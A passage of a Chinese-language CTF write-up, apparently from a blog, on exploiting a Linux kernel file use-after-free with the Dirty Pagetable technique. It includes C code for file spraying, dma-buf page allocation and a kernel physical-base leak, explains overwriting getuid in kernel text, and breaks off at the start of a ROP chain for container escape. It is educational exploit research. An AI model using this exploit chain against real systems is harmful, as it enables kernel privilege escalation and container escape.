class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">llist_node</span><span class="title">f_llist</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span> <span class="title">f_rcuhead</span>;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> f_iocb_flags;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">path</span><span class="title">f_path</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">inode</span>*<span class="title">f_inode</span>;</span><span class="comment">/* cached value */</span></span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span>*<span class="title">f_op</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Protects f_ep, f_flags.</span></span><br><span class="line"><span class="comment"> * Must not be taken from IRQ context.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">spinlock_t</span>f_lock;</span><br><span class="line"><span class="type">atomic_long_t</span>f_count;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> f_flags;</span><br><span class="line"><span class="type">fmode_t</span>f_mode;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mutex</span><span class="title">f_pos_lock</span>;</span></span><br><span class="line"><span class="type">loff_t</span>f_pos;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">fown_struct</span><span class="title">f_owner</span>;</span></span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span>*<span class="title">f_cred</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file_ra_state</span><span class="title">f_ra</span>;</span></span><br><span class="line"></span><br><span class="line">u64f_version;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SECURITY</span></span><br><span class="line"><span class="type">void</span>*f_security;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="comment">/* needed for tty driver, and maybe others */</span></span><br><span class="line"><span class="type">void</span>*private_data;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_EPOLL</span></span><br><span class="line"><span class="comment">/* Used by fs/eventpoll.c to link all the hooks to this file */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">hlist_head</span>*<span class="title">f_ep</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* #ifdef CONFIG_EPOLL */</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">address_space</span>*<span class="title">f_mapping</span>;</span></span><br><span class="line"><span class="type">errseq_t</span>f_wb_err;</span><br><span class="line"><span class="type">errseq_t</span>f_sb_err; <span class="comment">/* for syncfs */</span></span><br><span class="line">&#125; __randomize_layout</span><br><span class="line">  __attribute__((aligned(<span class="number">4</span>)));<span class="comment">/* lest something weird decides that 2 is OK */</span></span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å¯ä»¥ç”¨ file ç»“æ„ä½“å»å ä½ uaf çš„å †å—ï¼Œç„¶åä½¿ç”¨ kfree é‡Šæ”¾è¯¥ file ç»“æ„ä½“å°±ä¼šå‡ºç°ä¸€ä¸ª file uafã€‚ç”±äº file ç»“æ„ä½“æ˜¯ä½¿ç”¨ filp è¿›è¡Œå•ç‹¬ç®¡ç†çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬è¿™é‡Œè¿˜æ˜¯è¦æƒ³åŠæ³•è®© file uaf å¯¹åº”çš„ slab ç»™ buddy system å›æ”¶ï¼Œè¿™é‡Œæˆ‘é€‰ç”¨çš„æ–¹æ³•ä¾ç„¶æ˜¯å–·å°„å¤§é‡çš„ file ç»“æ„ä½“ç„¶åå…¨éƒ¨é‡Šæ”¾æ¥è§£å†³ã€‚ä¸‹ä¸€ä¸ªé—®é¢˜å°±æ˜¯å¦‚ä½•åœ¨ç”¨æˆ·æ€çŸ¥é“å“ªä¸ª file ç»™é‡Šæ”¾äº†ï¼Œæˆ‘è¿™é‡Œä½¿ç”¨çš„æ–¹æ³•æ˜¯ï¼š</p><ul><li>ç¬¬ä¸€æ¬¡å–·å°„å¤§é‡åªè¯»æƒé™çš„æ–‡ä»¶</li><li>åˆ©ç”¨ kfree é‡Šæ”¾å…¶ä¸­ä¸€ä¸ª file ç»“æ„ä½“</li><li>ç¬¬äºŒæ¬¡å–·å°„å¤§é‡åªå†™æƒé™çš„æ–‡ä»¶</li><li>å¯¹å‘æ‰€ä»¥ç¬¬ä¸€æ¬¡å–·å°„çš„æ–‡ä»¶å†™å…¥æ•°æ®ï¼Œå¦‚æœèƒ½å¤Ÿå†™å…¥æˆåŠŸåˆ™è¯´æ˜è¯¥æ–‡ä»¶ä¸º uaf çš„æ–‡ä»¶ã€‚</li></ul><p>ä¸Šè¿°è¿‡ç¨‹çš„æµç¨‹å›¾å¤§è‡´å¦‚ä¸‹ï¼š</p><img src="/2024/11/12/fileuaf/4.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>ä¸Šè¿°è¿‡ç¨‹çš„ä»£ç å®ç°å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">info(<span class="string">&quot;spray read file.&quot;</span>);</span><br><span class="line"><span class="type">int</span> read_fd[READ_FD];</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; READ_FD; i++)&#123;</span><br><span class="line">    read_fd[i] = open(<span class="string">&quot;/tmp/elf&quot;</span>,O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span>(read_fd[i] &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        err_exit(<span class="string">&quot;fail to open /tmp/elf&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">del(uaf_index);</span><br><span class="line"></span><br><span class="line">info(<span class="string">&quot;spray write file.&quot;</span>);</span><br><span class="line"><span class="type">int</span> write_fd[WRITE_FD];</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; WRITE_FD; i++)&#123;</span><br><span class="line">    write_fd[i] = open(<span class="string">&quot;/tmp/elf&quot;</span>,O_WRONLY);</span><br><span class="line">    <span class="keyword">if</span>(write_fd[i] &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        err_exit(<span class="string">&quot;fail to open /tmp/elf&quot;</span>);</span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">info(<span class="string">&quot;find the uaf read file&quot;</span>);</span><br><span class="line"><span class="type">int</span> uaf_read_fd = <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; READ_FD; i++)&#123;</span><br><span class="line">    <span class="type">int</span> ret = write(read_fd[i], buf, <span class="number">0x10</span>);</span><br><span class="line">    <span class="keyword">if</span>(ret &gt; <span class="number">1</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[+] find the uaf read fd %d \n&quot;</span>, i);</span><br><span class="line">        uaf_read_fd = i;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(uaf_read_fd == <span class="number">-1</span>)&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;can not find the uaf read fd.&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">info(<span class="string">&quot;close the file.&quot;</span>);</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; TMP_FD; i++)&#123;</span><br><span class="line">    close(tmp_fd[i]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; READ_FD; i++)&#123;</span><br><span class="line">    <span class="keyword">if</span>(i == uaf_read_fd)&#123;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    close(read_fd[i]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; WRITE_FD; i++)&#123;</span><br><span class="line">    close(write_fd[i]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥å°±èƒ½å¤Ÿè®© PTE æ¥å ä½æˆ‘ä»¬çš„ file uaf çš„å †å—</p><img src="/2024/11/12/fileuaf/5.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>ç»™ PTE å ä½å uaf å—åœ¨ gdb è°ƒè¯•çš„ç»“æœå¦‚ä¸‹ï¼š</p><img src="/2024/11/12/fileuaf/6.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>å¯ä»¥å‘ç° PTE æ‰€æŒ‡å‘ç‰©ç†åœ°å€æ˜¯ä»¥ 0x1000 é€’å¢çš„ï¼Œè¿™æ­£å¥½æ»¡è¶³ä¸€ä¸ªé¡µçš„å¤§å°ã€‚</p><p>ç„¶è€Œç”±äº file ç»“æ„ä½“ç»™é‡Šæ”¾äº†ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯¹è¯¥ file è¿›è¡Œå…¶ä»–æ“ä½œåŸºæœ¬éƒ½ä¼šå¯¼è‡´ kernel panicï¼Œå¯æ˜¯ dup ä¾ç„¶å¯ç”¨ã€‚é€šè¿‡çœ‹ file ç»“æ„ä½“çš„æºç æˆ‘ä»¬å¯ä»¥å‘ç°æœ‰ä¸ªå« f_count çš„å˜é‡åœ¨ file + 0x38 çš„ä½ç½®ï¼Œf_countè¡¨ç¤ºæ–‡ä»¶å¯¹è±¡çš„å¼•ç”¨è®¡æ•°ï¼Œå½“æˆ‘ä»¬è°ƒç”¨dupç³»ç»Ÿè°ƒç”¨å¤åˆ¶æ–‡ä»¶æè¿°ç¬¦æ—¶å®ƒå°†é€’å¢ã€‚å› æ­¤ï¼Œæˆ‘ä»¬è·å¾—ä¸€ä¸ªåŸè¯­æ¥é€’å¢ PTE ä¸­çš„æŒ‡é’ˆã€‚ç„¶è€Œæ­£å¸¸æƒ…å†µä¸‹ä¸€ä¸ªè¿›ç¨‹æœ€å¤šå¯ä»¥æ‹¥æœ‰ 0x400 ä¸ªæ–‡ä»¶æè¿°ç¬¦ï¼Œæˆ‘ä»¬æ— æ³• dup å¾ˆå¤šæ¬¡ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥é€šè¿‡ fork æ¥å®ç°å¤šæ¬¡ dupã€‚åœ¨è¿™é“é¢˜ç›®ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°åœ¨ startjail.sh ä¸­æœ‰æ¡å‘½ä»¤ï¼šulimit -Hn 33000ï¼Œè¿™è¡¨ç¤ºæˆ‘ä»¬èƒ½å¤Ÿåœ¨ä¸€ä¸ªè¿›ç¨‹ä¸­æœ€å¤šæ‹¥æœ‰ 33000 ä¸ªæ–‡ä»¶æè¿°ç¬¦ï¼Œè¿™å¤§å¤§æ–¹ä¾¿äº†æˆ‘ä»¬å¯¹ file uaf çš„åˆ©ç”¨ã€‚</p><p>æ¥ä¸‹æ¥æˆ‘ä»¬å°±å¯ä»¥å¯¹ uaf_file dup 0x1000 æ¬¡ï¼Œè¿™æ—¶å°±ä¼šå‡ºç°ç‰©ç†åœ°å€çš„é‡å ï¼š</p><img src="/2024/11/12/fileuaf/7.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>åˆ©ç”¨ dup å‡½æ•°ä»¤ PTE çš„æ¡ç›®é€’å¢ 0x1000:</p><img src="/2024/11/12/fileuaf/8.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>æœ€ç»ˆæ•ˆæœå¦‚ä¸‹ï¼š</p><img src="/2024/11/12/fileuaf/9.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>å¯ä»¥çœ‹è§ä¸¤ä¸ª PTE æ¡ç›®æŒ‡å‘äº†åŒä¸€ä¸ªç‰©ç†åœ°å€ï¼Œè¿™ä¸ªæ—¶å€™æˆ‘ä»¬å†ä½¿ç”¨ munmap é‡Šæ”¾æ‰æˆ‘ä»¬é‡å çš„ PTE å¯¹åº”çš„è™šæ‹Ÿå†…å­˜ï¼Œæˆ‘ä»¬å°±èƒ½å¤Ÿæ„é€ å‡ºç‰©ç†å†…å­˜ä¸Šçš„ page uafã€‚æœ‰äº†page uaf åæˆ‘ä»¬ç¬¬ä¸€æ—¶é—´å¯èƒ½ä¼šæƒ³åˆ°<font style="color:rgb(77, 77, 77);">ç”¨ç”¨æˆ·é¡µè¡¨å æ®é‡Šæ”¾é¡µï¼Œè¿™æ ·å°±èƒ½æ§åˆ¶ç”¨æˆ·é¡µè¡¨ï¼Œç„¶è€Œè¿™æ˜¯ä¸å¤ªç°å®çš„ã€‚åŒ¿åÂ mmap()Â åˆ†é…çš„ç‰©ç†é¡µæ¥è‡ªå†…å­˜åŒºçš„MIGRATE_MOVABLEÂ free_areaï¼Œè€Œç”¨æˆ·é¡µè¡¨æ˜¯ä»å†…å­˜åŒºçš„ MIGRATE_UNMOVABLEÂ free_area åˆ†é…ï¼Œæ‰€ä»¥å¾ˆéš¾é€šè¿‡é€’å¢ PTE ä½¿ä¹‹æŒ‡å‘å¦ä¸€ç”¨æˆ·é¡µè¡¨ã€‚è¿™é‡Œæˆ‘ä»¬é‡‡ç”¨å¦å¤–ä¸€ç§æ–¹å¼æ¥åˆ†é…ç‰©ç†é¡µï¼Œä½¿è¯¥ç‰©ç†é¡µå’Œç”¨æˆ·é¡µè¡¨æ¥è‡ªåŒä¸€å†…å­˜åŒºåŸŸï¼Œè¿™æ ·å¦‚æœå—å®³è€…PTEæŒ‡å‘è¯¥ç‰©ç†é¡µï¼Œå°±èƒ½é€šè¿‡é€’å¢è¯¥PTEï¼Œä½¿è¯¥PTEæŒ‡å‘æŸä¸ªç”¨æˆ·é¡µè¡¨ã€‚</font></p><p>ä¸‹é¢çš„æ“ä½œæ¥è‡ª dirty pageTable çš„æ–‡ç« <a href="https://yanglingxi1993.github.io/dirty_pagetable/dirty_pagetable.html">Dirty_Pagetable (yanglingxi1993.github.io)</a>ï¼š</p><hr><p>ä½œè€…é€‰ç”¨ dma-buf ç³»ç»Ÿå †æ¥åˆ†é…å…±äº«é¡µï¼Œå› ä¸ºå¯ä»¥ä» Android ä¸­ä¸å—ä¿¡ä»»çš„ APP æ¥è®¿é—® &#x2F;dev&#x2F;dma_heap&#x2F;systemï¼Œå¹¶ä¸” dma-buf çš„å®ç°ç›¸å¯¹ç®€å•ã€‚é€šè¿‡Â open(&#x2F;dev&#x2F;dma_heap&#x2F;system)Â å¯è·å¾—ä¸€ä¸ª dma heap fdï¼Œç„¶åç”¨ä»¥ä¸‹ä»£ç åˆ†é…ä¸€ä¸ªå…±äº«é¡µï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">dma_heap_allocation_data</span> <span class="title">data</span>;</span></span><br><span class="line"></span><br><span class="line">data.len = <span class="number">0x1000</span>;</span><br><span class="line">data.fd_flags = O_RDWR;</span><br><span class="line">data.heap_flags = <span class="number">0</span>;</span><br><span class="line">data.fd = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (ioctl(dma_heap_fd, DMA_HEAP_IOCTL_ALLOC, &amp;data) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    perror(<span class="string">&quot;DMA_HEAP_IOCTL_ALLOC&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> dma_buf_fd = data.fd;</span><br></pre></td></tr></table></figure><p>ç”±ç”¨æˆ·ç©ºé—´ä¸­çš„Â dma_buf_fd æ¥è¡¨ç¤ºä¸€ä¸ªå…±äº«é¡µï¼Œå¯é€šè¿‡ mmap()Â dma_buf_fd å°†å…±äº«é¡µæ˜ å°„åˆ°ç”¨æˆ·ç©ºé—´ã€‚ä» dma-buf ç³»ç»Ÿå †åˆ†é…çš„å…±äº«é¡µæœ¬è´¨ä¸Šæ˜¯ä»é¡µåˆ†é…å™¨åˆ†é…çš„ï¼ˆå®é™…ä¸Š dma-buf å­ç³»ç»Ÿé‡‡ç”¨äº†é¡µé¢æ± è¿›è¡Œä¼˜åŒ–ï¼Œå¯¹äºæœ¬åˆ©ç”¨æ²¡æœ‰å½±å“ï¼‰ã€‚ç”¨äºåˆ†é…å…±äº«é¡µçš„Â gfp_flagsÂ å¦‚ä¸‹æ‰€ç¤ºï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> HIGH_ORDER_GFP  (((GFP_HIGHUSER | __GFP_ZERO | __GFP_NOWARN \ <span class="comment">// HIGH_ORDER_GFP ç”¨äº order-8å’Œorder-4 page</span></span></span><br><span class="line">                | __GFP_NORETRY) &amp; ~__GFP_RECLAIM) \</span><br><span class="line">                | __GFP_COMP)</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LOW_ORDER_GFP (GFP_HIGHUSER | __GFP_ZERO | __GFP_COMP) <span class="comment">// LOW_ORDER_GFP ç”¨äº order-0 page</span></span></span><br><span class="line"><span class="type">static</span> <span class="type">gfp_t</span> order_flags[] = &#123;HIGH_ORDER_GFP, HIGH_ORDER_GFP, LOW_ORDER_GFP&#125;;</span><br></pre></td></tr></table></figure><p>å…±äº«é¡µåˆ†é… vs é¡µè¡¨åˆ†é…ï¼šä» LOW_ORDER_GFP å¯ä»¥çœ‹å‡ºï¼Œå•ä¸ªå…±äº«é¡µæ˜¯ä»å†…å­˜çš„ MIGRATE_UNMOVABLEÂ free_area ä¸­åˆ†é…çš„ï¼Œå’Œé¡µè¡¨åˆ†é…çš„å‡ºå¤„ä¸€æ ·ã€‚ä¸”å•ä¸ªå…±äº«é¡µä¸º order-1 ï¼ˆorder-0 ?ï¼‰ï¼Œå’Œé¡µè¡¨çš„ order ç›¸åŒã€‚ç»“è®ºæ˜¯ï¼Œå•ä¸ªå…±äº«é¡µå’Œé¡µè¡¨éƒ½æ˜¯ä»åŒä¸€ migrateÂ free_cache ä¸­åˆ†é…ï¼Œä¸” order ç›¸åŒã€‚</p><img src="/2024/11/12/fileuaf/10.svg" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p><font style="color:rgb(77, 77, 77);">å¯è§ï¼Œåœ¨ç‰©ç†å†…å­˜ä¸­ï¼Œå•ä¸ªå…±äº«é¡µå’Œç”¨æˆ·é¡µè¡¨åˆ†å¸ƒå¾—æ¯”è¾ƒç´§å‡‘ã€‚ç°åœ¨ï¼Œæˆ‘ä»¬æˆåŠŸå¯¹å…±äº«é¡µå’Œç”¨æˆ·é¡µè¡¨è¿›è¡Œäº† heap shapingã€‚</font></p><hr><p>æ€»çš„æ¥è¯´æˆ‘ä»¬å¯ä»¥åˆ©ç”¨ dma-buf æ¥è¾…åŠ©æˆ‘ä»¬è®©ç‰©ç†åœ°å€ page uaf çš„å †å—ç»™ DMA-buf heap ç»™å ä½ï¼Œè€Œè¯¥ heap åœ¨ç‰©ç†åœ°å€ä¸Šä¸å¦å¤–ä¸€ä¸ª PTE ç›¸é‚»ï¼Œæ­¤æ—¶æˆ‘ä»¬å³å¯å†æ¬¡åˆ©ç”¨ file uaf æ¥ä»¤ victim PTE æŒ‡å‘ PTE å¯¹åº”çš„ç‰©ç†åœ°å€ï¼Œè¿›è€Œèƒ½å¤Ÿä»»æ„ä¿®æ”¹ PTE çš„æ¡ç›®æ¥å®ç°ç‰©ç†åœ°å€ä¸Šçš„è¯»å†™ï¼Œå…¶å¸ƒç½®å¦‚ä¸‹ï¼š</p><img src="/2024/11/12/fileuaf/11.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>åˆ©ç”¨ file uaf å†æ¬¡ dup 0x1000 åï¼Œä¿®æ”¹ PTE çš„æ¡ç›®ï¼š</p><img src="/2024/11/12/fileuaf/12.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>æ¥ä¸‹æ¥æˆ‘ä»¬å·²ç»æ‹¥æœ‰ä¿®æ”¹ PTE çš„èƒ½åŠ›ï¼Œé‚£æˆ‘ä»¬è‚¯å®šè¦å…ˆè·å– kernel ä»£ç æ®µçš„åŸºå€æ‰èƒ½å¤Ÿå¯¹ä»£ç æ®µè¿›è¡Œå†™æ“ä½œï¼Œè¿™ä¸ªåœ°æ–¹çš„æ“ä½œæ¯”è¾ƒç‰›é€¼ï¼Œè¿™é‡Œå¼•ç”¨<a href="https://ptr-yudai.hatenablog.com/entry/2023/12/08/093606">Understanding Dirty Pagetable - m0leCon Finals 2023 CTF Writeup - CTFã™ã‚‹ã (hatenablog.com)</a>ï¼š</p><hr><p>Although itâ€™s already 2024, we can find some fixed physical addresses on bothÂ LinuxÂ andÂ Windows.</p><img src="/2024/11/12/fileuaf/13.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>The pages around here is always fixed, and data for page table is left. (Credit toÂ shift_cropsÂ who found it during HITCON.) The page table has a pointer to kernel-land physical address, which is useful for leaking the physical base address of the kernel.</p><hr><p>ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬å¯ä»¥ç›´æ¥åœ¨è¿™ä¸ªå›ºå®šçš„ç‰©ç†åœ°å€ä¸Šè·å–æŸä¸ªå†…æ ¸ä»£ç æ®µçš„åœ°å€ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Leak kernel physical base</span></span><br><span class="line"><span class="type">void</span> *wwwbuf = <span class="literal">NULL</span>;</span><br><span class="line">*(<span class="type">size_t</span>*)dmabuf = <span class="number">0x800000000009c067</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; N_PAGESPRAY; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (page_spray[i] == evil) <span class="keyword">continue</span>;</span><br><span class="line">    <span class="keyword">if</span> (*(<span class="type">size_t</span>*)page_spray[i] &gt; <span class="number">0xffff</span>) &#123;</span><br><span class="line">        wwwbuf = page_spray[i];</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[+] Found victim page table: %p\n&quot;</span>, wwwbuf);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+] wwwbuf data: %p \n&quot;</span>, ((*(<span class="type">size_t</span>*)wwwbuf)));</span><br></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥æˆ‘ä»¬å°±è¦æ‰¾åˆ°è¯¥åœ°å€ä¸å†…æ ¸ç‰©ç†åŸºå€çš„åç§»ï¼Œè¿™é‡Œæœ‰ä¸€ä¸ªæŠ€å·§ï¼Œå½“æˆ‘ä»¬å…³é—­äº† kaslr æ—¶å†…æ ¸çš„ç‰©ç†åŸºå€ä¼šå›ºå®šä¸º 0x1000000ï¼Œæˆ‘ä»¬å¯ä»¥å…³é—­ kaslr åå†è¿›è¡Œå¯¹åç§»çš„è®¡ç®—ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨ qemu monitor ä¸­è¿›è¡ŒéªŒè¯ã€‚</p><img src="/2024/11/12/fileuaf/14.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>å¯æ˜¯å¼€å¯äº† kaslr åè¿™ä¸ªåç§»ä¼šæœ‰ä¸€ç‚¹ç‚¹æ”¹å˜ :( ä¸è¿‡é—®é¢˜ä¸å¤§ï¼Œåœ¨å¼€å¯ kalsr æ—¶è°ƒè¯•æ”¹æ”¹å°±è¡Œã€‚</p><p>è¿™é‡Œå…¶å®è¿˜å¯ä»¥ä½¿ç”¨ gef å‡çº§ç‰ˆæœ¬æ¥ç›´æ¥è¿›è¡Œç‰©ç†åœ°å€å’Œè™šæ‹Ÿåœ°å€çš„è½¬æ¢ï¼ˆç¬”è€…è§‰å¾—è¿™ä¸ªåŠŸèƒ½çœŸçš„å¥½ç‰›é€¼ï¼‰ï¼Œç›¸å…³å‘½ä»¤ä¸º p2vã€v2p  </p><img src="/2024/11/12/fileuaf/16.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>é¡¹ç›®åœ°å€ä¸ºï¼š<a href="https://github.com/bata24/gef">https://github.com/bata24/gef</a>  </p><p>è·å¾—å†…æ ¸ç‰©ç†åœ°å€åŸºå€åå°±å¯ä»¥ç›´æ¥ä¿®æ”¹å†…æ ¸çš„ä»£ç æ®µäº†ï¼Œæˆ‘è¿™é‡Œé€‰æ‹©ä¿®æ”¹ getuid å‡½æ•°ã€‚</p><p>æˆ‘ä»¬çš„æœ€ç»ˆç›®æ ‡æ˜¯è¿›è¡Œå®¹å™¨é€ƒé€¸ï¼Œè¿™é‡Œå‚è€ƒ<a href="https://syst3mfailure.io/corjail/">[corCTF 2022] CoRJail: From Null Byte Overflow To Docker Escape Exploiting poll_list Objects In The Linux Kernel (syst3mfailure.io)</a>ä¸Šçš„ rop é“¾ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">buff = (<span class="type">char</span> *)<span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">1024</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Stack pivot    [1]</span></span><br><span class="line">*(<span 